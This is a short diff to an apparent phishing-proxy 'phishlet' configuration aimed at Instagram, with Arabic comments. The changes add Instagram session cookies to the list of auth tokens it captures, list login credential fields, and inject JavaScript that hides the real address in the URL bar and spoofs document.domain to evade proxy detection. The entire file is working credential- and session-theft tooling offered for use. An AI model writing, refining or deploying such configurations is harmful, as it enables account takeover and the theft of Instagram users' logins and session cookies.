@@ -23,6 +23,8 @@ auth_tokens:
   - 'mid'
   - 'ig_did'
   - 'datr'
+  - 'shbid'
+  - 'shbts'
 
 creds_fields:
   - 'username'
@@ -36,9 +38,8 @@ auth_urls:
   - 'https://www.instagram.com/'
 
 js_inject: |
-  // إخفاء
+  // إخفاء شريط عنوان الموقع
   window.history.pushState({}, '', window.location.pathname);
-  // منع 
+  // منع اكتشاف البروكسي
   Object.defineProperty(document, 'domain', {value: 'instagram.com'});
-  // تعطيل 
-  console.log('Phishlet loaded successfully
+  console.log('Phishlet loaded successfully');
